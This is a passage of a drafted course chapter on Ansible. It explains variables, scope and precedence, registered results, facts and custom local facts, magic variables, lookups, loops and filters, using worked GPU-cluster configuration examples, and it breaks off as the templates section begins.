---
id: "c04-07"
title: "4.7 Ansible variables, facts, templates and filters"
sidebar_label: "4.7 Ansible variables, facts, templates and filters"
sidebar_position: 7
description: "Defining and using Ansible variables, registered results, facts and custom facts, magic variables, lookups, filters and templates for generating configuration, with worked GPU-cluster examples and precedence debugging"
status: "drafted"
tier: "0"
level: "B"
lab_venue: "GCP / GKE"
---

# 4.7 Ansible variables, facts, templates and filters

| | |
|---|---|
| Level | Intermediate |
| Priority tier | 0 |
| Lab venue | ansible-core; 2 to 3 Linux targets; (a GPU host helps for the custom-fact examples) |
| Part | Part 4: Automation and infrastructure as code |
| Status | Drafted, labs **untested** |

## Why this matters for AI infrastructure

![Variables as the intent, facts as what each host really is and templates combining both into Slurm, NCCL, chrony, netplan and Prometheus config, versus four drifting copied playbooks.](./img/p4-0407-data-not-copies.svg)

*Figure 4.7.1. Variables say what you intend, facts say what each host is, and templates combine them so one playbook serves every batch.*

Suppose you have to configure a whole fleet with one playbook. Some nodes have 8 GPUs and others have 4. Some carry H100 cards and others carry A100s. The NICs differ too, with ConnectX-7 on some nodes and BlueField on others, and each rack uses its own management subnet. You could write a playbook for every machine type, but data is a better answer.

Picture a week when a second batch of servers arrives from a different purchase order. The new machines look almost the same as the old ones, but they differ in a few details. Copying the playbook and editing three lines in the copy works for one batch. By the fourth batch you have four playbooks that drift apart, and a fix that lands in one of them quietly misses the others. A playbook that reads its differences from data stays one playbook, and the differences live in one place where you can read them.

Three things make that work. Variables describe what you intend. Facts describe what each host actually is. Templates turn that data into Slurm (the job scheduler that places work on nodes), NCCL (NVIDIA's library for moving data between GPUs), chrony (the service that keeps clocks in step), netplan (Ubuntu's network configuration tool) or Prometheus (a metrics collector) configuration. Knowing where a value comes from, and which one wins when two sources disagree, is what separates a playbook that is correct on 1,000 nodes from one that is only correct on your laptop.

A kitchen makes a useful picture. The recipe card says what the dish should be, and that is the variable. The cook's check of what is actually on the plate is the fact. The plating template is the step that combines both into the finished plate that goes out. Each part does one job, so when a plate comes out wrong you can ask which part gave the wrong answer.

## Prerequisites and outcomes

You need the material from 4.4 to 4.6 before you start. When you finish this chapter, you should be able to do the following.

- Define variables at the right layer, such as play, vars files, inventory, role defaults or extra vars. Read them safely with defaults, asserts and type conversion.
- Capture and use task results with `register`, `set_fact`, `include_vars` and `vars_prompt`. Explain how variable scoping and lifetime work.
- Use facts (`ansible_facts`), gather subsets, cache facts and write custom local facts (`facts.d`). Use the magic variables `hostvars`, `groups`, `group_names`, `inventory_hostname` and `play_hosts`.
- Use lookups such as `env`, `file`, `template`, `pipe`, `url`, `password`, `vault` and `community.hashi_vault.hashi_vault`, and know where each one runs.
- Write templates with loops and filters that generate real configurations, validate them, and debug variable and template problems quickly.

## 1. Defining variables

A GPU fleet needs the same NCCL setting on every node, but two clusters need different values for it. NCCL is the communication library that moves data between GPUs during training, and its debug level is a setting people change often while they chase a slow job. Variables let one template or role carry both answers.

Imagine it is late on a Tuesday. A training job on the second cluster is slow, so you raise the NCCL debug level to get more detail in the logs. The next morning you find that the first cluster is printing the same verbose logs, and its disk is filling up. Nobody meant to change the first cluster. The setting was written in a place that reached further than you thought. The question this section answers is where a variable should be defined, so that the right value wins in the right place and nobody has to hunt for it later.

### Where and how

![A ladder of variable definition places from task vars and play vars through vars_files and vars_prompt to inventory, role, extra vars, set_fact, include_vars and lookups, with the placement rule and the NCCL debug story.](./img/p4-0407-where-defined.svg)

*Figure 4.7.2. A variable reaches as far as the place it is defined, so put each value where its owners will look.*

Suppose one group of GPU nodes must stay on driver branch 550, while a single special node needs something different. A driver branch is the release line of the NVIDIA driver, so the value 550 means the 550 series. Ansible lets you set that value in several places, and the place you choose decides how far the value reaches. It helps to think of a note on your own desk, a note on the team whiteboard and a notice on the front door of the building. Each one is seen by a wider crowd. The simplest place is the play itself. A play is one block in a playbook that maps a group of hosts to a list of tasks.

```yaml
- hosts: gpu
  vars:                              # play-level
    nvidia_driver_branch: 550
    nccl_env:
      debug: WARN
      ib_hca: "mlx5_0,mlx5_1"
  vars_files:
    - vars/common.yml
    - "vars/{{ ansible_facts['os_family'] | lower }}.yml"    # OS-specific variables chosen at runtime
  vars_prompt:                        # interactive; avoid in automation
    - name: reason
      prompt: "Maintenance reason"
      private: false
  tasks:
    - name: Use a variable
      ansible.builtin.debug:
        msg: "Driver branch {{ nvidia_driver_branch }}"
      vars:                           # task-level
        extra: 1
```

Read the example from the top down. The play-level `vars` block sets two values for every host in the `gpu` group. The `vars_files` list then loads two files, and the second file name is built at run time from the operating system family that each host reports. A Debian host and a RedHat host therefore load different files, and no `if` statement is needed to make that choice. Play-level `vars` belong to the play where they are defined, so they stop applying when the play ends. `vars_files` loads its files from the list, and `vars_prompt` asks the user for a value at run time. Be careful with `vars_prompt`. It stops the run and waits for a person to type an answer, so a job that runs on a schedule or inside a pipeline has nobody there to answer it. Notice that the `vars_files` path is itself a template. It can use a fact such as `ansible_facts['os_family']`, and that is what makes the file choice automatic. The `vars:` block inside the last task lives only for that one task, so `extra` disappears as soon as the task ends.

The play is only one of several places a variable can come from. The same kind of value can be set in inventory variables and in `group_vars` or `host_vars` (4.5), and in role `defaults/` and `vars/` (4.11). On the command line, `-e` (or `--extra-vars`) accepts `key=value`, a JSON-style string such as `'{"k": [1,2]}'`, or `@file.yml`. Tasks can also create variables with `set_fact` and `register`. `include_vars` loads a file or directory into the host's variables while the run is in progress. Finally, `lookup` results and environment variables read with `lookup('env', ...)` can fill in values.

In practice, put a value where the people who own it will look for it. A cluster-wide default belongs in `group_vars/all`. A rack's special case belongs in the group for that rack. A one-off test belongs on the command line, where it vanishes when the run ends. These places are not equal. Section 1 of 4.5 explains which one wins when two of them disagree, and that is the question to ask before you rely on any value.

### Naming and types

![A flow choosing between default for optional values, mandatory and assert for required values and argument specs for roles, with type conversion filters and the string no that tests as true.](./img/p4-0407-default-mandatory-assert.svg)

*Figure 4.7.3. Use default for optional values, mandatory and assert to fail before any node is touched, and bool to convert string booleans.*

![Variable naming rules with reserved names and role prefixes, typing by quoting a version string, and the dot versus bracket trap where my_dict.values returns a Python method instead of the key.](./img/p4-0407-names-and-brackets.svg)

*Figure 4.7.4. Prefix names by owner, quote versions to keep them strings, and use brackets when a key collides with a dictionary method.*

A variable name can contain letters, digits and underscores, but it cannot start with a digit. Avoid Python keywords and the names Ansible reserves for itself, such as `environment`, `name`, `hosts`, `tasks`, `connection` and `port`. A name like `port` looks harmless in one role, but it collides with a connection setting somewhere else. Variable names are not scoped by role, so start each name with the role or component that owns it, such as `slurm_` or `nvidia_`. The prefix tells the next reader who owns the value, and it keeps two roles from overwriting each other's `port` or `version`.

Types come from YAML, so a value can be a string, an int, a float, a boolean, a list or a dict. Quoting decides which one you get. In `nvidia_driver_branch: 550` the value is an int, but `"550.90.07"` must be quoted to stay a string. Quoting rules are covered in 4.4, and values such as `ansible_check_mode` and similar are booleans. A version such as `550.90.07` is not a number at all, because it has two dots. Quoting it keeps it as text, so a comparison on it does what you expect. When you are unsure, quote the value.

You read a value with `{{ nccl_env.debug }}`, `{{ nccl_env['ib_hca'] }}` or `{{ list[0] }}`. Use brackets when a key contains hyphens, spaces or dots, or when the key collides with a built-in Python dictionary method such as `items`, `keys`, `values`, `copy`, `get` or `update`. *Ansible: Up and Running* (chapter 5) points out the trap. If a dictionary has a key named `"values"`, writing `my_dict.values` returns Python's bound method `<built-in method values of dict object>` instead of the key's value. Subscript notation, `my_dict['values']`, always looks up the key. The rule is easy to remember with two plain examples. A key named `items` gives you a method under dot notation, and a key named `eth0.100` is a syntax error under dot notation. Brackets handle both.

The `stat` example in the same chapter (example 5-6) shows that four forms all work: `result['stat']['mode']`, `result['stat'].mode`, `result.stat['mode']` and `result.stat.mode`. Pick the form your team reads most easily, and keep it the same across one playbook. You can also join strings inside one `{{ ... }}` expression with the tilde operator `~`, as in `msg: "{{ 'The URL is https://' ~ server_name ~ '/index.html' }}"`.

Give every optional value a default, or check it with an assertion. Think of a default as a spare part kept in the drawer. `{{ optional_var | default('x') }}` supplies it only when the primary value is missing. `{{ must_exist | mandatory }}` is the opposite. It stops the job before any node is touched, which is much cheaper than discovering halfway through a fleet run that a rack variable was empty. An `assert` at the top of a play or role, such as `that: [ rack is defined, gpu_count | int > 0 ]`, fails early and with a clear message. Roles should go further and validate their inputs with an argument spec in `meta/argument_specs.yml` (4.11).

Convert types with filters such as `| int`, `| float`, `| bool`, `| string` and `| list`. A boolean written as a string, such as `"yes"` or `"True"`, needs `| bool` before you test it. Never compare a boolean with a string. The reason is that the string `"no"` is not empty, so a plain `if` test on it is true. The `| bool` filter turns the word into a real boolean first, so the test reads the way it looks.

### Scope and lifetime

![A lifetime table for play vars, inventory vars, set_fact and register, run_once, include_vars, vars_files and role variables, beside lazy rendering where driver_pkg is built from each host's own nvidia_driver_branch.](./img/p4-0407-set-fact-and-lazy.svg)

*Figure 4.7.5. set_fact and register are per-host for the rest of the play, and lazily rendered variables use each host's own values when read.*

![Variables have nested scopes, from a single task and a single play through host-scoped facts and registered values to whole-run inventory variables and unscoped role variables.](./img/p2-0407-scope-lifetime.svg)

*Figure 4.7.6. A variable's scope ranges from one task or play, through per-host facts, to whole-run inventory variables and unscoped role variables.*

Scope answers the question "where can I read this value?", and lifetime answers "for how long?". Play and task `vars` are scoped to the place where they are defined. Inventory, group and host variables apply to each host for the whole run. `set_fact` and `register` create host-scoped variables that stay in place for the rest of the play run. With `cacheable: true` and fact caching enabled, they can also carry over into later runs.

`set_fact` has the precedence of a task-level fact, and registered variables behave in a similar way. Each one is set per host. A task with `run_once` sets the variable only on the host that ran it, unless you distribute it with `delegate_facts` or by iterating over `hostvars`. `include_vars` loads variables at runtime, and its precedence is above play vars. `vars_files` loads at the start of the play.

Here is a concrete case. A first task runs `set_fact` to store a driver value on each GPU host, and the next task in the same play reads that value. The later task sees it, because the value stays with the host for the rest of the play. A task on a different host sees its own value, not this one. If you wanted one answer shared by every host, `run_once` alone is not enough, and you need the delegation or `hostvars` route described above.

Role variables are not scoped by default, so a variable set in one role is visible to later roles and tasks. That is the reason for prefixes. Values are also rendered lazily. Lazy means "evaluated when used, not when defined". A variable defined in terms of another, such as `b: "{{ a }}-x"`, is templated at the point of use. Suppose `group_vars/all.yml` sets `driver_pkg: "nvidia-driver-{{ nvidia_driver_branch }}"`. The branch is filled in only when a task reads `driver_pkg`, so a host-level override of the branch still changes the package name that host installs. The same laziness can create recursion, and `x: "{{ x }}"` produces an error, because the value keeps asking for itself.

Before you rely on a value, check the precedence order in 4.5, because the most surprising results come from layers you did not expect.

## 2. Registered results and set_fact

![The fields of a registered command result including rc and stdout_lines, the flow from register to set_fact to debug, the skipped-task trap on CPU-only nodes and the results list from a loop.](./img/p4-0407-register-anatomy.svg)

*Figure 4.7.7. register keeps the raw result, set_fact keeps one clean value, and a skipped task still defines the variable without output.*

![A command's output is registered as a raw dictionary, set_fact trims the first line into a clean value, and debug shows the whole structure.](./img/a07-register-set-fact.svg)

*Figure 4.7.8. The register step keeps the whole raw result, and set_fact turns one field of it into the clean value later tasks read.*

A task checks whether a driver is loaded, and the next task must decide what to do based on that answer. A human would do this without thinking. You run a command, read its output, and then choose your next step. An automation play needs the same loop, and `register` and `set_fact` are how the play keeps the answer. `register` stores the output of a task in a variable. `set_fact` turns a value you computed into a variable that the rest of the play can read. Together they let one task's result shape the work that follows.

A later task often needs a value that an earlier command printed, such as the driver version. You capture that output with `register`, then clean it up with `set_fact`. The example below shows both steps. Read it as a short story. First, Ansible runs `nvidia-smi` on the host and keeps everything the command printed. Second, `set_fact` takes the first line of that output and trims the spaces around it. Third, the `debug` task shows you the raw structure, so you can see each piece yourself before you rely on it.

```yaml
- name: Query driver version
  ansible.builtin.command: nvidia-smi --query-gpu=driver_version --format=csv,noheader
  register: drv
  changed_when: false

- name: Keep a clean value
  ansible.builtin.set_fact:
    current_driver: "{{ drv.stdout_lines[0] | trim }}"

- ansible.builtin.debug:
    var: drv                             # show the whole structure: rc, stdout, stdout_lines, stderr, changed, failed, start, end, delta, cmd
```

The `debug` task at the end prints the whole dictionary, including `rc`, `stdout`, `stdout_lines`, `stderr`, `changed`, `failed`, `start`, `end`, `delta` and `cmd`. The most useful fields are `rc`, the return code, where zero usually means success, and `stdout_lines`, the output split into one list item per line. A registered variable exists even when its task was skipped. In that case it carries `skipped: true`, so test it with `drv is not skipped` or `drv is defined and drv.rc == 0` before you use it.

This matters in practice when a `when:` condition skips a task. Suppose a driver check runs only on GPU nodes. On a CPU-only node the task is skipped, but the variable still exists, with no `stdout_lines` in it. If your next task reads `drv.stdout_lines[0]` without a check, it fails on the CPU-only node with an error about a missing value. The safe pattern is to test first, as the paragraph above shows.

A task with `loop:` registers a `results` list, with one entry per item. Each entry is a full result dictionary of its own, so you read `drv.results[0].stdout` for the first item. Put your logic in `failed_when` and `changed_when` expressions instead of post-processing by hand. A read-only command such as `nvidia-smi --query-gpu` should carry `changed_when: false`, because reading a value changes nothing on the host, and the run summary should say so.

Use `set_fact` to derive a value once and reuse it. Think of it as writing a label on a jar. You prepare the contents once, then every later task reads the label instead of opening the jar again. It is not a way to write programming loops, so reach for filters instead. Mark an expensive computed fact `cacheable: true` if later runs will reuse it. Keep `set_fact` from becoming hidden global state that nobody can trace, and give each computed value a name that says what it holds.

Keep the raw output in `register` and the cleaned value in `set_fact`, so each variable does one job. When the cleaned value looks wrong, you still have the raw output to compare against, and that is the first thing to check.

## 3. Facts

![Fact gathering speed levers of subsets, timeouts, smart gathering with a cache and on-demand fact modules, with version-aware conditions and a role that publishes GPU facts from nvidia-smi, lspci or DCGM probes.](./img/p4-0407-fact-gathering-cost.svg)

*Figure 4.7.9. Gather only the subsets you need, cache facts on big fleets, and publish GPU facts from a probe role because setup does not describe GPUs.*

![Three setup module commands for all facts, a filter and a gather_subset, the categories of facts, a summary line built from ansible_facts and the advice to use ansible_facts instead of short injected names.](./img/p4-0407-facts-commands.svg)

*Figure 4.7.10. Read facts with setup filters and subsets, and prefer ansible_facts[name] over the short injected variable names.*

Before a playbook can make a sensible decision about a node, it needs to know what the node is: its OS, its kernel, its memory. Facts are that description, gathered from the machine at the start of a play. They are the reason one playbook can handle Ubuntu and Rocky nodes without two copies of every task.

Imagine you log in to a node that was reinstalled overnight. Before you run anything, you want its OS, kernel and memory. Facts answer those questions. Gathering them is not free, though, because fact gathering costs seconds per host. Ansible runs a small program on each target that inspects the machine and sends back what it finds, and that round trip happens before your first real task. On a fleet of hundreds of nodes, those seconds add up to minutes.

Facts are variables that Ansible discovers about each host. The `setup` module returns hundreds of them when `gather_facts: true` is set. They cover the distribution, kernel, CPU count, memory, mounts, network interfaces and addresses, DMI info (the hardware identity the BIOS reports, such as the vendor and model), environment, date and time, SELinux (a Linux access-control system), user and Python. Each fact is a key in a dictionary, so you read it the way you would look up a field on a form.

```bash
ansible gpu001 -m ansible.builtin.setup | less
ansible gpu001 -m ansible.builtin.setup -a 'filter=ansible_default_ipv4'
ansible gpu001 -m ansible.builtin.setup -a 'gather_subset=!all,!min,network,hardware'
```

The first command prints every fact for one host and pipes it into `less`, so you can scroll through the whole dictionary. The second narrows the output with `filter`, which is useful when you only want the default network route. The third excludes `all` and `min`, then gathers the `network` and `hardware` subsets. That is the kind of command you run when a node misbehaves and you want its network and hardware view without the rest of the noise.

Once you have the facts, you can read them in a task. The example below builds one summary line from several of them. It divides the memory value in MB by 1024 to show GiB (gibibytes, a binary unit where 1 GiB is 1024 MiB). Notice that the value is a plain number, so the division works without any conversion first.

```yaml
- name: Show key facts
  ansible.builtin.debug:
    msg: >-
      {{ inventory_hostname }}: {{ ansible_facts['distribution'] }} {{ ansible_facts['distribution_version'] }},
      kernel {{ ansible_facts['kernel'] }}, {{ ansible_facts['processor_vcpus'] }} vCPUs,
      {{ (ansible_facts['memtotal_mb'] / 1024) | round(1) }} GiB RAM,
      primary IP {{ ansible_facts['default_ipv4']['address'] }}
```

The short injected names, such as `ansible_distribution`, are being de-emphasised. Prefer `ansible_facts['distribution']` instead. Reading from the `ansible_facts` dictionary keeps host data out of the variable namespace. The older names all share one global space, so a host-reported value can sit next to your own variables with the same name and nobody notices which one a task read. The `inject_facts_as_vars` setting controls how the short names are created.

You can choose which facts to gather with `gather_subset`. Its values are `min`, `hardware`, `network`, `virtual` and `all`, and you negate one with `!`. A GPU node has a lot of hardware data, and a play that only needs the IP address can skip most of it. `gather_timeout` and the `filter` option of `setup` also help. For a large fleet, set `gathering = smart` with a cache, using `fact_caching = jsonfile`, `redis` or `memcached`. Smart gathering reuses the cached facts instead of collecting them again on every run. You can also set `gather_facts: false` and call `setup` with a small subset only where you need it. The `package_facts`, `service_facts`, `mount_facts` and `ansible.builtin.getent` modules gather extra state on demand, so you pay for them only in the plays that ask.

To branch on the distribution, use a condition such as `when: ansible_facts['os_family'] == 'Debian'`. A condition like this reads as a plain sentence: run the task when the family is Debian. For version checks, use `ansible_facts['distribution_major_version'] is version('9', '>=')`. The `version` test compares numbers the way a version should be compared, so 10 is treated as newer than 9. Hardware needs a different approach. Do not rely on `setup` alone for GPU data, because it does not describe GPUs by default. Probe the device with `nvidia-smi -L`, `lspci -d 10de:` (10de is NVIDIA's PCI vendor ID) or DCGM, and wrap those probes in a role. The role can publish facts such as `gpu_count`, `gpu_model`, `nvlink_present` and `ib_hcas`, so that later plays and templates can read them. The probe runs once, and everything after it reads the answer as a fact.

### Custom (local) facts

![An INI site.fact and an executable gpu.fact on the target in facts.d feeding ansible_local during fact gathering, with the task that publishes and reads the GPU count.](./img/p4-0407-local-facts.svg)

*Figure 4.7.11. Files and executables in facts.d appear under ansible_local, so a host can declare its own rack and GPU count.*

Hosts can describe themselves. Any `.fact` file, or any executable, placed in `/etc/ansible/facts.d/` on the target is picked up during fact gathering. The file can be INI or JSON, or the executable can print JSON. Its values then appear under `ansible_local.<name>`. This is the supported way for a host to declare its own attributes, such as its rack, role or hardware class. Those attributes stay with the host, so they do not depend on the control node.

Picture a sign on the node itself that says which rack it lives in. Anyone who logs in can read it, and so can an automation run. A custom fact works the same way. The node carries its own label, so the playbook does not need a separate spreadsheet that might be out of date. The INI file below is a plain `.fact` file. The task after it writes an executable one, which prints a JSON count of the GPUs found by `nvidia-smi -L`. Because the script runs on the target, it always counts the GPUs that are actually present, even if the inventory was written before a card was replaced.

```ini
# /etc/ansible/facts.d/site.fact
[location]
rack=r07
rail=3
```

```yaml
- name: Publish local fact
  ansible.builtin.copy:
    dest: /etc/ansible/facts.d/gpu.fact
    mode: "0755"
    content: |
      #!/bin/sh
      n=$(nvidia-smi -L 2>/dev/null | wc -l)
      echo "{\"count\": $n}"
- ansible.builtin.setup: { filter: ansible_local }
- ansible.builtin.debug: { msg: "{{ ansible_local.gpu.count }} GPUs on {{ inventory_hostname }}" }
```

### Magic variables

![A table of Ansible magic variables including inventory_hostname, groups, group_names, hostvars, play batch variables, run metadata, paths and omit, with the hostvars versus host_vars distinction and an HAProxy backend loop.](./img/p4-0407-magic-table.svg)

*Figure 4.7.12. Magic variables are set by Ansible, and hostvars is a runtime dictionary that is different from the host_vars directory.*

![A limited run gathers facts only for one host, so hostvars for the other hosts is empty and the template fails or writes blank addresses.](./img/a07-limit-hostvars.svg)

*Figure 4.7.13. Running with --limit gathers facts for only one host, so a template that reads other hosts gets empty values.*

Ansible sets magic variables for you, so you never define them yourself. The table lists the common ones.

| Variable | Meaning |
|---|---|
| `inventory_hostname`, `inventory_hostname_short` | The host's name in inventory |
| `ansible_host`, `ansible_user`... | Connection variables |
| `groups` | Dict of group name to host list (`groups['gpu']`) |
| `group_names` | Groups the current host belongs to |
| `hostvars` | Dict of host to all of that host's variables and facts (`hostvars['slurmctl01']['ansible_default_ipv4']['address']`); only includes hosts whose facts were gathered earlier in the run for fact values |
| `play_hosts` / `ansible_play_hosts`, `ansible_play_batch` | Hosts in the current play / current serial batch |
| `ansible_play_name`, `ansible_check_mode`, `ansible_diff_mode`, `ansible_run_tags`, `ansible_limit` | Run metadata |
| `playbook_dir`, `role_path`, `inventory_dir` | Paths |
| `omit` | Special placeholder to drop a parameter |
| `ansible_version`, `ansible_python` | Controller details |

Cross-host data is where `hostvars` and `groups` earn their place. Suppose you need every node address in `/etc/hosts`, in a Slurm configuration, or in an HAProxy backend. HAProxy is a load balancer that spreads traffic across a list of servers. *Ansible: Up and Running* (chapter 5) shows a load-balancer block built from `{% for host in groups.web %} server {{ host }} {{ hostvars[host].ansible_default_ipv4.address }}:80 {% endfor %}`, and the same pattern is modelled in `code/part04/ansible_variables_facts.py`. Read that block the way you would read a seating chart. The loop walks the list of web servers, and for each name it looks up that server's address in `hostvars`. Keep the two names apart. `hostvars` is a runtime dictionary that exists while the run is happening, while `host_vars/` is a directory on disk with files you edit by hand.

Those address facts exist only if they were gathered for those hosts in this run, either by an earlier play with `gather_facts` or from a cache. A common bug shows up with `--limit`. Suppose you run `ansible-playbook site.yml --limit lb01` because you only want to fix the load balancer. If a play is limited to one host with `--limit lb01`, it can still template a cluster-wide file. The `hostvars` entries for `web1..3` or `gpu001..032` then come back empty or undefined, because those hosts were never gathered. The template then fails, or worse, it writes a backend list with blank addresses. Gather facts for the whole group first, with `- hosts: cluster / gather_facts: true / tasks: []` and `tags: [always]`, or cache them.

![Magic variables](./img/m4-07-1.svg)

*Figure 4.7.14. Magic variables, as a diagram.*

Before a limited run that templates across hosts, gather facts for the whole group.

## 4. Lookups

![A table of lookups env, file, template, pipe, url, password, hashi_vault, vars, loop builders, first_found and misc sources with the use of each and a note that they run on the control node.](./img/p4-0407-lookup-table.svg)

*Figure 4.7.15. Lookups cover environment, files, secrets and loop builders, and all of them run on the control node at render time.*

![Two lanes where lookup joins three SSH keys into one comma string that a loop runs once on, while query returns a list so the loop runs three times, with the cost and control-node rules for lookups.](./img/p4-0407-lookup-vs-query.svg)

*Figure 4.7.16. lookup joins values into one string, query returns a list for loops, and both run on the control node each time they are evaluated.*

![Lookups read data on the control node, while a module reads data on the target and returns it with register.](./img/a07-lookup-control-node.svg)

*Figure 4.7.17. Lookups fetch values on the control node when a template is rendered, while data from a target comes back through a module and register.*

Some data does not belong in the inventory. A secret lives in a vault, a value lives in a file, and a hostname comes from DNS. A lookup fetches that value at run time, so the playbook asks the source of truth instead of copying the value into code where it goes stale. Copying is tempting, because it works today. Next month the secret is rotated, the copy is not, and the job fails in the middle of the night with an error that points nowhere useful.

Say a task needs an SSH public key that lives on your laptop, not on the target. A lookup can read that file for you, but it reads from the control node. The control node is the machine where you type `ansible-playbook`, and it is often your laptop or a bastion host. Lookups fetch data from outside the playbook, and they run on the control node at the moment the template is rendered. Rendering means filling in the `{{ }}` parts of a value, which happens just before a task uses it. The table lists the common ones and what each is for.

| Lookup | Use |
|---|---|
| `env` | `lookup('env', 'HOME')`; control-node environment |
| `file` | Read a local file's content (e.g., an SSH public key) |
| `template` | Render a local template to a string |
| `pipe` | Run a local command, return stdout (use sparingly; side effects on every evaluation) |
| `url` | Fetch a URL on the control node |
| `password` | Generate/persist a random password in a local file; `lookup('password', 'creds/db chars=ascii_letters,digits length=24')` |
| `community.hashi_vault.hashi_vault` | Read secrets from Vault |
| `ansible.builtin.vars` / `varnames` | Look up variables by name |
| `ansible.builtin.dict`, `items`, `subelements`, `together`, `nested`/`product`, `cartesian` | Build loops over structures |
| `ansible.builtin.first_found` | Pick the first existing file from a list (OS-specific vars) |
| `ansible.builtin.ini`, `csvfile`, `community.general.dig` (DNS), `community.general.random_pet` | Misc data sources |

The `lookup()` call returns a string, joined with commas, by default. That is fine for a single value, but it breaks a loop, because a loop wants a list of items. The `query()` call, also written `q()`, always returns a list, so prefer `query` when you feed the result into a loop. Picture a loop over three SSH keys. With `lookup()`, the loop sees one long string with commas in it, and it runs once with the wrong shape of data. With `query()`, the loop sees three items and runs three times.

A lookup runs every time it is evaluated, so keep expensive lookups out of loops. A `url` lookup inside a loop over a large group would fetch the same page once for every host in that group. Remember that lookups run where Ansible runs, not on the targets. For data from a target, use a module and `register` instead, because a module runs on the host it describes. The `with_<lookup>:` form is the older way of writing `loop:` together with a lookup. You will still see it in older roles, and the `loop:` form does the same job more clearly.

## 5. Loops over data

![Three loop patterns over a list of dicts creating users with loop_control, over a dict with dict2items for sysctl and over nested data with subelements, plus until retries polling and passing a list to a module.](./img/p4-0407-loop-patterns.svg)

*Figure 4.7.18. Loop over lists of dicts, dict2items pairs or subelements, and pass lists straight to modules that accept them.*

A cluster has dozens of interfaces to configure, and each one needs the same three settings. Writing one task per interface is tedious, and a single copy-paste slip breaks one of them quietly. A loop lets one task repeat over a list of data. The list is the only thing that changes from one interface to the next. Think of a loop as a checklist printed once and ticked off for each item. The steps stay the same, and only the item in the box changes.

You may need several service accounts, each with its own UID (the numeric user ID Linux uses) and groups. A loop handles that and keeps the task list short. The example shows the common patterns.

```yaml
- name: Create service accounts
  ansible.builtin.user:
    name: "{{ item.name }}"
    uid: "{{ item.uid }}"
    groups: "{{ item.groups | default([]) }}"
    shell: /bin/bash
  loop:
    - { name: slurm, uid: 990, groups: [] }
    - { name: munge, uid: 991 }
  loop_control:
    label: "{{ item.name }}"             # shorter output
    pause: 0
    index_var: idx

- name: Per-key iteration over a dict
  ansible.builtin.sysctl:
    name: "{{ item.key }}"
    value: "{{ item.value }}"
  loop: "{{ sysctl_settings | dict2items }}"

- name: Nested data
  ansible.builtin.debug:
    msg: "{{ item.0.name }} -> {{ item.1 }}"
  loop: "{{ users | subelements('keys') }}"
```

The first task loops over a list of dicts. Each item is one account, and `item.name` reads its name. Its `loop_control` shortens the output with `label`, sets `pause` to 0 and names the loop counter `idx`. With `label` set, the log shows `slurm` instead of the whole record, which keeps a long run readable. The second loops over a dict, and `dict2items` turns each key and value into a pair, so `item.key` is the sysctl name and `item.value` is the number to set. The third uses `subelements` to flatten a nested list. Each user holds a list of keys, and the loop produces one pair per key. So `item.0.name` is the user and `item.1` is one of that user's keys, and the loop runs once for every key of every user.

Prefer `loop` with filters such as `dict2items`, `subelements`, `product`, `zip`, `flatten` and `batch` over hand-written logic. Use `until` and `retries` for polling, which means "keep checking until the answer is right, and give up after a set number of tries". That pattern suits a service that takes a minute to start. If a module accepts a list, pass the whole list: `package: name: [a, b, c]` runs as one transaction, which is much faster than a loop of three calls. Checkpoint question 13 at the end of this chapter explains the timing reason.

## 6. Filters for configuration generation

![A table of Ansible filters grouped by need from dict merge and sets to regex, version, hashing, serialisation and network, with six worked expressions such as extract, unique sort, RealMemory and ipaddr.](./img/p4-0407-filter-needs.svg)

*Figure 4.7.19. Reach for a filter by need, and use map extract to pull one hostvar from many hosts at once.*

![The map extract filter looks up ansible_host for each host name in hostvars, and the list filter returns a plain list of addresses.](./img/a07-extract-pipeline.svg)

*Figure 4.7.20. The map extract filter pulls one host variable for each name in a group, and the list filter turns the result into a plain list of addresses.*

Raw data is rarely in the shape a config file needs. A list of hosts must become a comma-separated string, and a memory figure must become a rounded whole number. Filters reshape the data inline, so the template stays readable and the reshaping is visible next to the value it changes. A filter is written after a pipe character, `|`, and it takes the value on its left and returns a new value. You can think of a row of stations on an assembly line. The value enters at the left, each filter adds one change, and the finished value comes out at the right.

Your template may need to merge two dictionaries, pick one address from each host and format the result. Filters let you do each step in a single expression. Ansible adds its own filters on top of the Jinja2 builtins covered in 4.4, and you will use the ones in this table often. The table is a lookup list. You do not need to memorise it, but it helps to know that a filter for your problem probably exists before you write a loop by hand.

| Need | Filter |
|---|---|
| Dict merge (recursive) | `base \| combine(override, recursive=True)` |
| List ↔ dict | `dict2items`, `items2dict`, `zip`, `zip_longest`, `product`, `permutations` |
| Set operations | `union`, `intersect`, `difference`, `symmetric_difference`, `unique` |
| Flatten/shape | `flatten`, `community.general.json_query` (JMESPath queries) |
| Regex | `regex_search`, `regex_findall`, `regex_replace('^(.*)\\.example\\.com$', '\\1')` |
| Paths | `basename`, `dirname`, `splitext` |
| Version | `is version('2.0', '>=')`, `ansible.builtin.version` |
| Hash/crypt | `hash('sha256')`, `password_hash('sha512', salt)`, `b64encode` |
| Serialise | `to_json`, `to_nice_json`, `to_yaml`, `to_nice_yaml`, `from_json`, `from_yaml` |
| IP/network | `ansible.utils.ipaddr`, `ipsubnet`, `ipmath`, `next_nth_usable`, `ansible.utils.cidr_merge`, `hwaddr` (needs `netaddr`) |
| Defaulting | `default`, `default(omit)`, `mandatory`, `ternary('a','b')` |
| Misc | `random`, `shuffle`, `human_readable`, `human_to_bytes`, `quote`, `comment`, `expanduser` |

The examples below show how these filters combine. Each line is a Jinja2 expression, and its comment states what the result is.

```jinja
{{ gpu_nodes | map('extract', hostvars, 'ansible_host') | list }}            {# list of addresses #}
{{ groups['gpu'] | map('extract', hostvars, 'rack') | unique | sort }}        {# racks in use #}
{{ (ansible_facts['memtotal_mb'] * 0.9) | int }}                              {# Slurm RealMemory ~90% #}
{{ base_cfg | combine({'log_level': 'debug'}, recursive=True) }}
{{ '10.1.0.0/24' | ansible.utils.ipaddr('10') }}                              {# 10th address: 10.1.0.10/24 #}
{{ (item.size | human_to_bytes) // (1024**3) }}                               {# GiB #}
{{ is_prod | ternary('warn', 'debug') }}
```

The `extract` filter does the most work here, because it pulls one hostvar from many hosts at once. Read the first line from the left. It takes the list of GPU host names, and for each name it looks up that host's `ansible_host` inside `hostvars`. The result is a plain list of addresses, ready for the next filter. The memory line in the block above shows the same idea on a single host. It multiplies a number, then trims the result to a whole integer, so the config gets a clean value. Each example stays small on purpose, so that you can check each filter on its own before you chain them together.

## 7. Templates in practice

![An annotated template task for slurm.conf with src, owner and mode, backup for undo, validate before replacing the live file and notify for a handler that runs only on change.](./img/p4-0407-template-module-options.svg)

*Figure 4.7.21. backup allows undo, validate protects the live file from a broken render, and notify reloads only when the file changed.*

